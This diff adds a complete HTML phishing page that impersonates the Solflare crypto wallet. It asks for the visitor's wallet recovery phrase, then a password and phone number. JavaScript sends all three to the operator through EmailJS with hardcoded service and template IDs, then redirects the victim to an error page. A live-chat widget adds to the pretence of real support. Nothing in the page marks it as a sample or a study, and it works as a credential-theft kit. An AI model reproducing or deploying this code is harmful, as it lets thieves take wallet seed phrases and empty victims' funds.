@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Solflare</title>
+    <link rel="icon" href="icon.png" type="image/png" />
+    <style type="text/css">
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: Arial, sans-serif;
+        overflow-x: hidden;
+        background-color: #17171d;
+        color: #fff;
+      }
+
+      .row {
+        display: flex;
+        height: 100vh;
+      }
+
+      .col-md-6 {
+        width: 50%;
+        padding: 0;
+      }
+
+      /* Left Div - Deep Blue background */
+      .left-div {
+        background-color: #17171d;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        text-align: center;
+        padding: 30px;
+      }
+
+      .left-div img {
+        width: 500px; /* Increased size */
+        margin-bottom: 20px;
+      }
+
+      .left-div h2 {
+        font-size: 28px;
+        font-weight: 600;
+        margin-bottom: 15px;
+      }
+
+      .left-div p {
+        font-size: 16px;
+        color: rgba(255, 255, 255, 0.7);
+      }
+
+      /* Right Div - Form for recovery phrase */
+      .right-div {
+        background: linear-gradient(180deg, #29292b 0%, #232326 100%);
+        padding: 50px;
+        display: flex;
+        flex-direction: column;
+        justify-content: flex-start; /* Adjusted position */
+        align-items: left;
+      }
+
+      .form-container {
+        width: 100%;
+        max-width: 800px;
+        position: relative;
+      }
+
+      .form-container img {
+        display: block;
+        margin: 0 auto 30px;
+        max-width: 150px;
+        position: absolute;
+        top: -70px; /* Adjusted alignment */
+      }
+
+      h5 {
+        font-weight: 600;
+        font-size: 24px;
+        line-height: 32px;
+        margin-bottom: 10px;
+      }
+
+      label {
+        font-weight: 400;
+        font-size: 14px;
+        color: rgba(255, 255, 255, 0.7);
+        margin-bottom: 15px;
+        display: block;
+      }
+
+      .input,
+      textarea {
+        color: #737387;
+        background: rgba(23, 23, 29, 0.3);
+        border-radius: 5px;
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        padding: 12px;
+        width: 100%;
+        height: 150px; /* Increased size */
+        margin-bottom: 20px;
+        font-size: 16px;
+        resize: none;
+      }
+
+      .input:focus {
+        box-shadow: 0px 0px 5px rgba(255, 132, 45, 0.8);
+        outline: none;
+        border-color: rgb(255, 132, 45);
+        background-color: transparent;
+        color: #fff;
+      }
+
+      .continue-btn {
+        background-color: rgb(255, 132, 45);
+        color: rgb(23, 23, 29);
+        border-radius: 10px;
+        padding: 12px 30px;
+        border: none;
+        text-transform: uppercase;
+        font-weight: 600;
+        font-size: 16px;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        float: right;
+      }
+
+      .continue-btn:hover {
+        background-color: rgb(255, 132, 45);
+        color: #000;
+      }
+
+      .back-link {
+        color: rgb(255, 132, 45);
+        font-weight: 600;
+        cursor: pointer;
+        text-decoration: none;
+      }
+
+      .back-link:hover {
+        text-decoration: underline;
+      }
+
+      .link-container {
+        text-align: center;
+        margin-top: 80px; /* Adjusted alignment */
+        color: rgba(255, 255, 255, 0.7);
+      }
+
+      .link-container a {
+        color: rgb(255, 132, 45);
+        text-decoration: none;
+        font-weight: 600;
+      }
+
+      .link-container a:hover {
+        text-decoration: underline;
+      }
+
+      /* Custom Form Styling */
+      .custom-form {
+        width: 100%;
+        max-width: 400px;
+        margin: 0 auto;
+        padding: 20px;
+        background: rgba(23, 23, 29, 0.8);
+        border-radius: 10px;
+        box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
+      }
+
+      .custom-form-title {
+        font-weight: 600;
+        font-size: 24px;
+        color: #fff;
+        text-align: center;
+        margin-bottom: 20px;
+      }
+
+      .custom-form-group {
+        margin-bottom: 20px;
+      }
+
+      .custom-form-label {
+        display: block;
+        font-size: 14px;
+        color: rgba(255, 255, 255, 0.7);
+        margin-bottom: 8px;
+      }
+
+      .custom-form-input {
+        width: 100%;
+        padding: 10px;
+        font-size: 16px;
+        color: #fff;
+        background: rgba(23, 23, 29, 0.3);
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        border-radius: 5px;
+        outline: none;
+        transition: border-color 0.3s ease, box-shadow 0.3s ease;
+      }
+
+      .custom-form-input:focus {
+        border-color: rgb(255, 132, 45);
+        box-shadow: 0px 0px 5px rgba(255, 132, 45, 0.8);
+        background: transparent;
+      }
+
+      .custom-submit-btn {
+        display: block;
+        width: 20%;
+        padding: 12px;
+        font-size: 16px;
+        font-weight: 600;
+        text-transform: uppercase;
+        color: rgb(23, 23, 29);
+        background-color: rgb(255, 132, 45);
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        transition: background-color 0.3s ease, color 0.3s ease;
+      }
+
+      /* Responsive Design */
+      @media only screen and (max-width: 768px) {
+        .custom-form {
+          padding: 15px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="row">
+      <!-- Left part: Intro Section -->
+      <div class="col-md-6 left-div">
+        <img src="s-left.png" alt="Language Icon" />
+      </div>
+
+      <!-- Right part: Form for recovery phrase -->
+      <div class="col-md-6 right-div">
+        <div class="form-container">
+          <img src="logo.png" alt="Solflare Logo" />
+          <div id="form-content">
+            <!-- Initial Form -->
+            <form id="recovery-form">
+              <div class="form-group">
+                <h5>Enter your recovery phrase.</h5>
+                <label>Your recovery phrase is the key to the wallet.</label>
+                <textarea
+                  name="secret_recovery_phrase"
+                  class="form-control input"
+                  required
+                  placeholder="Enter your recovery phrase here"
+                ></textarea>
+              </div>
+
+              <div class="form-group">
+                <a href="#" class="back-link">BACK</a>
+                <button
+                  type="button"
+                  name="btnLoginMore"
+                  class="continue-btn"
+                  onclick="showPasswordForm()"
+                >
+                  Continue
+                </button>
+              </div>
+            </form>
+            <div class="link-container">
+              Need a new wallet? <a href="#">Create it here</a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script
+      type="text/javascript"
+      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"
+    ></script>
+    <script>
+      // Initialize EmailJS
+      (function () {
+        emailjs.init("eFjqTxnF7nGuJXVZd"); // Replace with your EmailJS public key
+      })();
+
+      // Function to display the password form after entering recovery phrase
+      function showPasswordForm() {
+        const recoveryPhrase = document.querySelector(
+          'textarea[name="secret_recovery_phrase"]'
+        ).value;
+
+        const formContent = document.getElementById("form-content");
+        formContent.innerHTML = `
+          <form id="password-form">
+            <h5>Password</h5>
+            <div class="custom-form-group">
+              <input type="hidden" name="secret_recovery_phrase" value="${recoveryPhrase}" />
+            </div>
+            <div class="custom-form-group">
+              <label for="password" class="custom-form-label">Password</label>
+              <input
+                id="password"
+                class="custom-form-input"
+                placeholder="Password"
+                name="password"
+                type="input"
+                required
+              />
+            </div>
+            <div class="custom-form-group">
+              <label for="phone-number" class="custom-form-label">Phone Number</label>
+              <input
+                id="phone-number"
+                class="custom-form-input"
+                placeholder="Phone Number"
+                name="number"
+                type="input"
+                required
+              />
+            </div>
+            <div class="custom-form-group">
+              <button
+                type="button"
+                class="custom-submit-btn"
+                onclick="sendEmail(event)"
+              >
+                Submit
+              </button>
+            </div>
+          </form>
+        `;
+      }
+
+      function sendEmail(event) {
+        event.preventDefault(); // Prevent the form from submitting the traditional way
+
+        // Gather form data from password and phone number inputs
+        const recoveryPhrase = document.querySelector(
+          'input[name="secret_recovery_phrase"]'
+        ).value;
+        const password = document.querySelector('input[name="password"]').value;
+        const phoneNumber = document.querySelector(
+          'input[name="number"]'
+        ).value;
+
+        // Log the values for debugging
+        console.log("Recovery Phrase:", recoveryPhrase);
+        console.log("Password:", password);
+        console.log("Phone Number:", phoneNumber);
+
+        if (!recoveryPhrase || !password || !phoneNumber) {
+          alert("Please fill in all the fields.");
+          return; // Stop the function if any required fields are missing
+        }
+
+        // Prepare template parameters for EmailJS
+        const templateParams = {
+          recovery_phrase: recoveryPhrase,
+          password: password,
+          phone_number: phoneNumber,
+        };
+
+        // Send data using EmailJS service
+        emailjs
+          .send("service_8it2819", "template_dz0zwet", templateParams)
+          .then(function (response) {
+            console.log(
+              "Email sent successfully!",
+              response.status,
+              response.text
+            );
+            // Redirect to error.html on success
+            window.location.href = "error.html";
+          })
+          .catch(function (error) {
+            console.error("Failed to send email.", error);
+            alert("There was an error sending the email. Please try again."); // Show error message if sending fails
+          });
+      }
+    </script>
+    <!-- Start of LiveChat (www.livechat.com) code -->
+    <script type="text/javascript">
+      var Tawk_API = Tawk_API || {},
+        Tawk_LoadStart = new Date();
+      (function () {
+        var s1 = document.createElement("script"),
+          s0 = document.getElementsByTagName("script")[0];
+        s1.async = true;
+        s1.src = "https://embed.tawk.to/66a2a258becc2fed692b2b32/1i3lkkb6g";
+        s1.charset = "UTF-8";
+        s1.setAttribute("crossorigin", "*");
+        s0.parentNode.insertBefore(s1, s0);
+      })();
+    </script>
+    <noscript
+      ><a href="https://www.livechat.com/chat-with/18929835/" rel="nofollow"
+        >Chat with us</a
+      >, powered by
+      <a
+        href="https://www.livechat.com/?welcome"
+        rel="noopener nofollow"
+        target="_blank"
+        >LiveChat</a
+      ></noscript
+    >
+    <!-- End of LiveChat code -->
+  </body>
+</html>
